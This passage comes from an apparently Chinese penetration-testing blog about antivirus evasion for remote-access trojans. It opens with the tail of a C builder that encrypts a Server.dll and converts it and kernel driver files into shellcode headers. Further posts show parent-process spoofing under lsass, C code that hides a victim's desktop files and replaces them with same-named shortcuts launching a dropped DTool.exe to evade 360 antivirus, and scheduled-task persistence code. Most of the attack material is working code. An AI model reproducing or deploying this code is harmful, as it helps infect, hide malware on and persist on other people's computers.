NULL)){VirtualFree(pOutBuff, 0, MEM_RELEASE);CloseHandle(hOutFile);return FALSE;}if (!WriteFile(hOutFile, OutData2, strlen(OutData2), &amp;BytesWritten, NULL)){VirtualFree(pOutBuff, 0, MEM_RELEASE);CloseHandle(hOutFile);return FALSE;}if (!WriteFile(hOutFile, OutData3, strlen(OutData3), &amp;BytesWritten, NULL)){VirtualFree(pOutBuff, 0, MEM_RELEASE);CloseHandle(hOutFile);return FALSE;}if (!WriteFile(hOutFile, OutData4, strlen(OutData4), &amp;BytesWritten, NULL)){VirtualFree(pOutBuff, 0, MEM_RELEASE);CloseHandle(hOutFile);return FALSE;}if (!WriteFile(hOutFile, pOutBuff, (dwSysSize*5-1)+((dwSysSize+32-1)/32*2), &amp;BytesWritten, NULL)){VirtualFree(pOutBuff, 0, MEM_RELEASE);CloseHandle(hOutFile);return FALSE;}if (!WriteFile(hOutFile, OutData5, strlen(OutData5), &amp;BytesWritten, NULL)){VirtualFree(pOutBuff, 0, MEM_RELEASE);CloseHandle(hOutFile);return FALSE;}if (!WriteFile(hOutFile, OutData6, strlen(OutData6), &amp;BytesWritten, NULL)){VirtualFree(pOutBuff, 0, MEM_RELEASE);CloseHandle(hOutFile);return FALSE;}VirtualFree(pOutBuff, 0, MEM_RELEASE);CloseHandle(hOutFile);return TRUE;}BOOL SaveDr64(char *FileName) //生成DriverCode64(DriverCode64.h){HANDLE hSysFile;DWORD dwSysSize;LPVOID pSysBuff;DWORD BytesRead;LPVOID pOutBuff;HANDLE hOutFile;DWORD BytesWritten;hSysFile = CreateFile(FileName, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);if (hSysFile == INVALID_HANDLE_VALUE)return FALSE;dwSysSize  = GetFileSize(hSysFile, 0);pSysBuff = VirtualAlloc(NULL, dwSysSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);if (pSysBuff == NULL){CloseHandle(hSysFile);return FALSE;}if (!ReadFile(hSysFile, pSysBuff, dwSysSize, &amp;BytesRead, NULL)){VirtualFree(pSysBuff, 0, MEM_RELEASE);CloseHandle(hSysFile);return FALSE;}CloseHandle(hSysFile);pOutBuff = VirtualAlloc(NULL, (dwSysSize*5-1)+((dwSysSize+32-1)/32*2), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);if (pOutBuff == NULL){VirtualFree(pSysBuff, 0, MEM_RELEASE);return FALSE;}char *pDllChar = (char *)pSysBuff;char *pOutChar = (char *)pOutBuff;for (DWORD i = 0; i &lt; dwSysSize; i++){if (i == dwSysSize - 1){sprintf(pOutChar, "0x%0.2X", (unsigned char)*pDllChar++);pOutChar += 4;}else{sprintf(pOutChar, "0x%0.2X,", (unsigned char)*pDllChar++);pOutChar += 5;}if (i % 32 == 31 || i == dwSysSize - 1){*pOutChar++ = '\r';*pOutChar++ = '\n';}}VirtualFree(pSysBuff, 0, MEM_RELEASE);char OutData1[] = "/*\r\n DriverCode64 By Anonymity\r\n My QQ ????????\r\n"" 直接include此单元，使用 DriverCode64SaveFile(\"xxx.xxx\");即可生成文件\r\n*/\r\n\r\n";char OutData2[] = "#ifndef _HEX_DRIVERCODE64_\r\n#define _HEX_DRIVERCODE64_\r\n#include &lt;windows.h&gt;\r\n\r\n";char OutData3[64] = {0};sprintf(OutData3, "const g_DriverCode64FileSize = %d;\r\n", dwSysSize);char OutData4[] = "unsigned char g_DriverCode64FileBuff[] = {\r\n";char OutData5[] = "};\r\n\r\n";char OutData6[] = "/*\r\nbool DriverCode64SaveFile(char *FileName)\r\n{\r\n\tbool Result = false;""\r\n\tHANDLE hFile;\r\n\tDWORD dwBytesWritten;\r\n""\thFile = CreateFile(FileName,GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,NULL,NULL);\r\n""\tif (hFile == INVALID_HANDLE_VALUE) Result = false;\r\n""\tif (WriteFile(hFile, g_DriverCode64FileBuff, g_DriverCode64FileSize, &amp;dwBytesWritten, NULL)) Result = true;\r\n""\tCloseHandle(hFile);\r\n\treturn Result;\r\n}\r\n*/\r\n\r\n#endif\r\n";hOutFile = CreateFile("DriverCode64.h", GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, 0, NULL);if (hOutFile == INVALID_HANDLE_VALUE){VirtualFree(pOutBuff, 0, MEM_RELEASE);return FALSE;}if (!WriteFile(hOutFile, OutData1, strlen(OutData1), &amp;BytesWritten, NULL)){VirtualFree(pOutBuff, 0, MEM_RELEASE);CloseHandle(hOutFile);return FALSE;}if (!WriteFile(hOutFile, OutData2, strlen(OutData2), &amp;BytesWritten, NULL)){VirtualFree(pOutBuff, 0, MEM_RELEASE);CloseHandle(hOutFile);return FALSE;}if (!WriteFile(hOutFile, OutData3, strlen(OutData3), &amp;BytesWritten, NULL)){VirtualFree(pOutBuff, 0, MEM_RELEASE);CloseHandle(hOutFile);return FALSE;}if (!WriteFile(hOutFile, OutData4, strlen(OutData4), &amp;BytesWritten, NULL)){VirtualFree(pOutBuff, 0, MEM_RELEASE);CloseHandle(hOutFile);return FALSE;}if (!WriteFile(hOutFile, pOutBuff, (dwSysSize*5-1)+((dwSysSize+32-1)/32*2), &amp;BytesWritten, NULL)){VirtualFree(pOutBuff, 0, MEM_RELEASE);CloseHandle(hOutFile);return FALSE;}if (!WriteFile(hOutFile, OutData5, strlen(OutData5), &amp;BytesWritten, NULL)){VirtualFree(pOutBuff, 0, MEM_RELEASE);CloseHandle(hOutFile);return FALSE;}if (!WriteFile(hOutFile, OutData6, strlen(OutData6), &amp;BytesWritten, NULL)){VirtualFree(pOutBuff, 0, MEM_RELEASE);CloseHandle(hOutFile);return FALSE;}VirtualFree(pOutBuff, 0, MEM_RELEASE);CloseHandle(hOutFile);return TRUE;}BOOL SaveMain(char *FileName, char *AddTable) //生成加密后的文件(Server.dll){HANDLE hDllFile;DWORD dwDllSize;LPVOID pDllBuff;DWORD BytesRead;DWORD BytesWritten;hDllFile = CreateFile(FileName, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);if (hDllFile == INVALID_HANDLE_VALUE)return FALSE;dwDllSize  = GetFileSize(hDllFile, 0);pDllBuff = VirtualAlloc(NULL, dwDllSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);if (pDllBuff == NULL){CloseHandle(hDllFile);return FALSE;}if (!ReadFile(hDllFile, pDllBuff, dwDllSize, &amp;BytesRead, NULL)){VirtualFree(pDllBuff, 0, MEM_RELEASE);CloseHandle(hDllFile);return FALSE;}CloseHandle(hDllFile);EncrypMain((char *)pDllBuff, dwDllSize, AddTable);hDllFile = CreateFile(FileName, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, NULL);if (hDllFile == INVALID_HANDLE_VALUE){VirtualFree(pDllBuff, 0, MEM_RELEASE);return FALSE;}if (!WriteFile(hDllFile, pDllBuff, dwDllSize, &amp;BytesWritten, NULL)){VirtualFree(pDllBuff, 0, MEM_RELEASE);CloseHandle(hDllFile);return FALSE;}VirtualFree(pDllBuff, 0, MEM_RELEASE);CloseHandle(hDllFile);return TRUE;}BOOL SaveCode(char *FileName) //生成ShellCode(ShellCode.h){HANDLE hDllFile;DWORD dwDllSize;LPVOID pDllBuff;DWORD BytesRead;LPVOID pOutBuff;HANDLE hOutFile;DWORD BytesWritten;hDllFile = CreateFile(FileName, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);if (hDllFile == INVALID_HANDLE_VALUE)return FALSE;dwDllSize  = GetFileSize(hDllFile, 0);pDllBuff = VirtualAlloc(NULL, dwDllSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);if (pDllBuff == NULL){CloseHandle(hDllFile);return FALSE;}if (!ReadFile(hDllFile, pDllBuff, dwDllSize, &amp;BytesRead, NULL)){VirtualFree(pDllBuff, 0, MEM_RELEASE);CloseHandle(hDllFile);return FALSE;}CloseHandle(hDllFile);pOutBuff = VirtualAlloc(NULL, (dwDllSize*5-1)+((dwDllSize+32-1)/32*2), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);if (pOutBuff == NULL){VirtualFree(pDllBuff, 0, MEM_RELEASE);return FALSE;}char *pDllChar = (char *)pDllBuff;char *pOutChar = (char *)pOutBuff;for (DWORD i = 0; i &lt; dwDllSize; i++){if (i == dwDllSize - 1){sprintf(pOutChar, "0x%0.2X", (unsigned char)*pDllChar++);pOutChar += 4;}else{sprintf(pOutChar, "0x%0.2X,", (unsigned char)*pDllChar++);pOutChar += 5;}if (i % 32 == 31 || i == dwDllSize - 1){*pOutChar++ = '\r';*pOutChar++ = '\n';}}VirtualFree(pDllBuff, 0, MEM_RELEASE);char OutData1[] = "/*\r\n ShellCode转换器 By Anonymity\r\n My QQ ????????\r\n"" 直接include此单元，使用 ShellCodeSaveFile(\"xxx.xxx\");即可生成文件\r\n*/\r\n\r\n";char OutData2[] = "#ifndef _HEX_SHELLCODE_\r\n#define _HEX_SHELLCODE_\r\n#include &lt;windows.h&gt;\r\n\r\n";char OutData3[64] = {0};sprintf(OutData3, "const g_ShellCodeFileSize = %d;\r\n", dwDllSize);char OutData4[] = "unsigned char g_ShellCodeFileBuff[] = {\r\n";char OutData5[] = "};\r\n\r\n";char OutData6[] = "/*\r\nbool ShellCodeSaveFile(char *FileName)\r\n{\r\n\tbool Result = false;""\r\n\tHANDLE hFile;\r\n\tDWORD dwBytesWritten;\r\n""\thFile = CreateFile(FileName,GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,NULL,NULL);\r\n""\tif (hFile == INVALID_HANDLE_VALUE) Result = false;\r\n""\tif (WriteFile(hFile, g_ShellCodeFileBuff, g_ShellCodeFileSize, &amp;dwBytesWritten, NULL)) Result = true;\r\n""\tCloseHandle(hFile);\r\n\treturn Result;\r\n}\r\n*/\r\n\r\n#endif\r\n";hOutFile = CreateFile("ShellCode.h", GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, 0, NULL);if (hOutFile == INVALID_HANDLE_VALUE){VirtualFree(pOutBuff, 0, MEM_RELEASE);return FALSE;}if (!WriteFile(hOutFile, OutData1, strlen(OutData1), &amp;BytesWritten, NULL)){VirtualFree(pOutBuff, 0, MEM_RELEASE);CloseHandle(hOutFile);return FALSE;}if (!WriteFile(hOutFile, OutData2, strlen(OutData2), &amp;BytesWritten, NULL)){VirtualFree(pOutBuff, 0, MEM_RELEASE);CloseHandle(hOutFile);return FALSE;}if (!WriteFile(hOutFile, OutData3, strlen(OutData3), &amp;BytesWritten, NULL)){VirtualFree(pOutBuff, 0, MEM_RELEASE);CloseHandle(hOutFile);return FALSE;}if (!WriteFile(hOutFile, OutData4, strlen(OutData4), &amp;BytesWritten, NULL)){VirtualFree(pOutBuff, 0, MEM_RELEASE);CloseHandle(hOutFile);return FALSE;}if (!WriteFile(hOutFile, pOutBuff, (dwDllSize*5-1)+((dwDllSize+32-1)/32*2), &amp;BytesWritten, NULL)){VirtualFree(pOutBuff, 0, MEM_RELEASE);CloseHandle(hOutFile);return FALSE;}if (!WriteFile(hOutFile, OutData5, strlen(OutData5), &amp;BytesWritten, NULL)){VirtualFree(pOutBuff, 0, MEM_RELEASE);CloseHandle(hOutFile);return FALSE;}if (!WriteFile(hOutFile, OutData6, strlen(OutData6), &amp;BytesWritten, NULL)){VirtualFree(pOutBuff, 0, MEM_RELEASE);CloseHandle(hOutFile);return FALSE;}VirtualFree(pOutBuff, 0, MEM_RELEASE);CloseHandle(hOutFile);return TRUE;}BOOL SavePlug(){HANDLE hDllFile;DWORD dwDllSize;LPVOID pDllBuff;DWORD BytesRead;DWORD BytesWritten;hDllFile = CreateFile("1.dll", GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);if (hDllFile == INVALID_HANDLE_VALUE)return FALSE;dwDllSize  = GetFileSize(hDllFile, 0);pDllBuff = VirtualAlloc(NULL, dwDllSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);if (pDllBuff == NULL){CloseHandle(hDllFile);return FALSE;}if (!ReadFile(hDllFile, pDllBuff, dwDllSize, &amp;BytesRead, NULL)){VirtualFree(pDllBuff, 0, MEM_RELEASE);CloseHandle(hDllFile);return FALSE;}CloseHandle(hDllFile);// if (((PIMAGE_DOS_HEADER)pDllBuff)-&gt;e_magic == IMAGE_DOS_SIGNATURE)// //EncryptPlug((unsigned char *)pDllBuff, dwDllSize, 1024);// else// //DecryptPlug((unsigned char *)pDllBuff, dwDllSize, 1024);// hDllFile = CreateFile("2.dll", GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, NULL);if (hDllFile == INVALID_HANDLE_VALUE){VirtualFree(pDllBuff, 0, MEM_RELEASE);return FALSE;}if (!WriteFile(hDllFile, pDllBuff, dwDllSize, &amp;BytesWritten, NULL)){VirtualFree(pDllBuff, 0, MEM_RELEASE);CloseHandle(hDllFile);return FALSE;}VirtualFree(pDllBuff, 0, MEM_RELEASE);CloseHandle(hDllFile);return TRUE;}int main(int argc, char* argv[]){unsigned char MyFileTabLe[] = {0xBE, 0x16, 0xCF, 0x52, 0xCD};if (argc == 3){if (argv[1][0] != '-') return -1;switch (argv[1][1]){case '3': //输入文件名(QAssist32.sys), 生成"DriverCode32.h"return SaveDr32(argv[2]) ? 0 : -1;case '6': //输入文件名(QAssist64.sys), 生成"DriverCode64.h"return SaveDr64(argv[2]) ? 0 : -1;case 'E': //输入未加密文件名(Server.dll), 生成加密后的文件(Server.dll)return SaveMain(argv[2], (char *)MyFileTabLe) ? 0 : -1;case 'S': //输入已加密文件名(Server.dll), 生成"ShellCode.h"return SaveCode(argv[2]) ? 0 : -1;default:return -1;}}return SavePlug() ? 0 : -1;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.8-cong-yuan-ma-jie-jue-rat-mian-sha-wen-ti-zhong/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.8-cong-yuan-ma-jie-jue-rat-mian-sha-wen-ti-zhong/</url>
      
        <content type="html"><![CDATA[<h2 id="RAT父进程检测与绕过技术（一）"><a href="#RAT父进程检测与绕过技术（一）" class="headerlink" title="RAT父进程检测与绕过技术（一）"></a>RAT父进程检测与绕过技术（一）</h2><p>监控父进程和子进程之间的关系是威胁检测团队检测恶意活动的常用技术，例如，如果powershell是子进程，而Microsoft Word是父进程，这种这种异常行为各种EDR可以很容易地检测到，这时红队可以考虑使用父进程PID欺骗作为逃避方法。<br>Windows API——“CreateProcess”允许用户传入一个用于分配父进程PID的参数，这意味着当恶意进程从实际执行的父进程创建时，它可以使用其他的进程作为其父进程。最初这项技术是由Didier Stevens在2009年提出，于此同时他还发布了一个用C++编写的POC(SelectMyParent），它允许用户通过指定PID来选择其父进程，”CreateProcess”函数与”STARTUPINFOEX”和”LPPROC_Thread_ATTRIBUTE_LIST”一起使用：</p><pre class="line-numbers language-none"><code class="language-none">SelectMyParent.exe notepad 508<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650933853044/8b23f4a4ed384348b82593c949b2435c.png" alt="image.png"></p><p>PID 508对应于负责登录活动、密码更改等操作的”lsass.exe”进程，在执行完上述命令之后Notepad将在lsass.exe进程下创建</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650933853044/175adf67982047dcb52e75854d711c52.png" alt="image.png"></p><p>对进程属性的检查显示notepad以系统级权限运行，这是因为子进程(notepad.exe)获得了父进程(lsass.exe)的特权:</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650933853044/9fd46da91493443998502c2ca4d4b277.png" alt="image.png"></p><h2 id="RAT父进程检测与绕过技术（二）"><a href="#RAT父进程检测与绕过技术（二）" class="headerlink" title="RAT父进程检测与绕过技术（二）"></a>RAT父进程检测与绕过技术（二）</h2><p>利用快捷方式，由用户启动程序，进行绕过360数字父进程查杀，代码如下</p><pre class="line-numbers language-none"><code class="language-none">int bypass_360_startup(){TCHAR str_desktop[256];LPITEMIDLIST pidl;SHGetSpecialFolderLocation(NULL, CSIDL_DESKTOP, &amp;pidl);//place the shortcut on the desktop  SHGetPathFromIDList(pidl, str_desktop); if (if_need_infection(str_desktop) == 0)//是否需要感染  {OutputDebugStringA("bypass_360_startup if_need_infection return");return 0;} if (set_hide_directory(str_desktop) == 0)//设置目录为隐藏属性  {OutputDebugStringA("bypass_360_startup set_hide_directory return");return 0;} if (create_link(str_desktop) == 0)//创建同名的快捷方式  {OutputDebugStringA("bypass_360_startup create_link return");return 0;} return 0;}  int if_need_infection(TCHAR str_disk[]){OutputDebugStringA("if_need_infection fun:");CSearchFile file; file.SearchFile(_T("."), str_disk); for (DWORD i = 0; i&lt;file.MyVectorFile.size(); i++){OutputDebugString(file.MyVectorFile[i].szFilePath);} if (file.MyVectorFile.size()&gt;0){return 1;} return 0;}  int set_hide_directory(TCHAR str_disk[]){OutputDebugStringA("set_hide_directory fun:");CSearchFile file; file.SearchFile(_T("."), str_disk); for (DWORD i = 0; i &lt; file.MyVectorFile.size(); i++){SetFileAttributes(file.MyVectorFile[i].szFilePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);//设置隐藏属性  OutputDebugString(file.MyVectorFile[i].szFilePath);} return 1;} int create_link(TCHAR str_disk[]){OutputDebugStringA("create_link fun:");CSearchFile file; file.SearchFile(_T("."), str_disk); for (DWORD i = 0; i &lt; file.MyVectorFile.size(); i++){TCHAR str_all_user_path[MAX_PATH] = { 0 };TCHAR str_exe_path[MAX_PATH] = { 0 };//DTool.exe的路径  GetEnvironmentVariable(_T("ALLUSERSPROFILE"), str_all_user_path, MAX_PATH);_stprintf(str_exe_path, _T("%s\\updata\\DTool.exe"), str_all_user_path); TCHAR path_buffer[_MAX_PATH];_stprintf(path_buffer, _T("%s.lnk"), file.MyVectorFile[i].szFilePath);//OutputDebugString(path_buffer);  CreateLinkThenChangeIcon(str_exe_path, path_buffer);} return 1; } void CreateLinkThenChangeIcon(LPTSTR fname_to_create_link,LPTSTR lnk_fname){CoInitialize(0); HRESULT hres;IShellLink *psl = NULL;IPersistFile *pPf = NULL;WCHAR wsz[256];TCHAR buf[256];int id;LPITEMIDLIST pidl; hres = CoCreateInstance(CLSID_ShellLink, NULL,CLSCTX_INPROC_SERVER,IID_IShellLink,(LPVOID*)&amp;psl);if (FAILED(hres))goto cleanup;hres = psl-&gt;QueryInterface(IID_IPersistFile, (LPVOID*)&amp;pPf);if (FAILED(hres))goto cleanup;hres = psl-&gt;SetPath(fname_to_create_link);if (FAILED(hres)) goto cleanup;//place the shortcut on the desktop   SHGetSpecialFolderLocation(NULL, CSIDL_DESKTOP, &amp;pidl);//创建到桌面s   SHGetPathFromIDList(pidl, buf); lstrcat(buf, _T("\\"));lstrcat(buf, lnk_fname); #ifdef UNICODE  hres = pPf-&gt;Save(buf, TRUE);#else  MultiByteToWideChar(CP_ACP, 0, lnk_fname, -1, wsz, MAX_PATH);//这里lnk_fname给的是全路径  hres = pPf-&gt;Save(wsz, TRUE);#endif   if (FAILED(hres)) goto cleanup; GetSystemDirectory(buf, 256); lstrcat(buf, _T("\\shell32.dll")); hres = psl-&gt;SetIconLocation(buf, 3);//15在shell32.dll中是我的电脑图标,220为IE图标,3为文件夹   if (FAILED(hres)) goto cleanup; hres = psl-&gt;GetIconLocation(buf, 256, &amp;id); if (FAILED(hres)) goto cleanup; pPf-&gt;Save(wsz, TRUE); cleanup: if (pPf) pPf-&gt;Release(); if (psl) psl-&gt;Release(); CoUninitialize();}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="RAT利用权限维持持久免杀（三）"><a href="#RAT利用权限维持持久免杀（三）" class="headerlink" title="RAT利用权限维持持久免杀（三）"></a>RAT利用权限维持持久免杀（三）</h2><h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><p>程序功能分为三部分，首先是初始化，其次是添加计划任务，最后添加了删除计划任务功能。</p><p>以下只展示思路与代码demo</p><h4 id="1-Initialization"><a href="#1-Initialization" class="headerlink" title="1.Initialization"></a>1.Initialization</h4><p>为了获取到获取 ITaskService 对象以及 ITaskFolder 对象</p><p>首先初始化COM接口</p><pre class="line-numbers language-none"><code class="language-none">//  初始化 COMhr = CoInitializeEx(NULL, COINIT_MULTITHREADED);  //  设置 COM security levels.  hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);  //  创建Task Service对象  hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&amp;pService);  //  连接到Task Service  hr = pService-&gt;Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());  hr = pService-&gt;GetFolder(_bstr_t(L"\\"), &amp;pRootFolder);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-CreateTask"><a href="#2-CreateTask" class="headerlink" title="2.CreateTask"></a>2.CreateTask</h4><p>首先创建任务定义对象，进行任务创建操作</p><pre class="line-numbers language-none"><code class="language-none">hr = pService-&gt;NewTask(0, &amp;pTask);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接着设置注册信息</p><pre class="line-numbers language-none"><code class="language-none">hr = pTask-&gt;get_RegistrationInfo(&amp;pRegInfo);//作者hr = pRegInfo-&gt;put_Author(_bstr_t(wszAuthor));//描述hr = pRegInfo-&gt;put_Description(_bstr_t(wszDescription));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设置主体信息</p><pre class="line-numbers language-none"><code class="language-none">hr = pTask-&gt;get_Principal(&amp;pPrincipal);  //  设置登陆类型hr = pPrincipal-&gt;put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);  // 设置运行权限hr = pPrincipal-&gt;put_RunLevel(TASK_RUNLEVEL_HIGHEST);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设置任务相关信息</p><pre class="line-numbers language-none"><code class="language-none">hr = pTask-&gt;get_Settings(&amp;pSettings);hr = pSettings-&gt;put_StartWhenAvailable(VARIANT_TRUE);hr = pSettings-&gt;get_IdleSettings(&amp;pIdleSettings);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>创建触发器</p><pre class="line-numbers language-none"><code class="language-none">hr = pTask-&gt;get_Triggers(&amp;pTriggerCollection);hr = pTriggerCollection-&gt;Create(TASK_TRIGGER_LOGON, &amp;pTrigger);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>设置执行操作</p><pre class="line-numbers language-none"><code class="language-none">hr = pActionCollection-&gt;Create(TASK_ACTION_EXEC, &amp;pAction);hr = pAction-&gt;QueryInterface(IID_IExecAction, (void**)&amp;pExecAction);//设置程序路径等信息hr = pExecAction-&gt;put_Path(_bstr_t(wszProgramPath));......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在ITaskFolder对象注册</p><pre class="line-numbers language-none"><code class="language-none">hr = pRootFolder-&gt;RegisterTaskDefinition(_bstr_t(wszTaskName), pTask, TASK_CREATE_OR_UPDATE, _variant_t(), _variant_t(), TASK_LOGON_INTERACTIVE_TOKEN, _variant_t(L""), &amp;pRegisteredTask);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-DeleteTask"><a href="#3-DeleteTask" class="headerlink" title="3.DeleteTask"></a>3.DeleteTask</h4><p>直接根据事先写好的名字删除即可</p><pre class="line-numbers language-none"><code class="language-none">hr = pRootFolder-&gt;DeleteTask(_bstr_t(TaskName), 0);<span 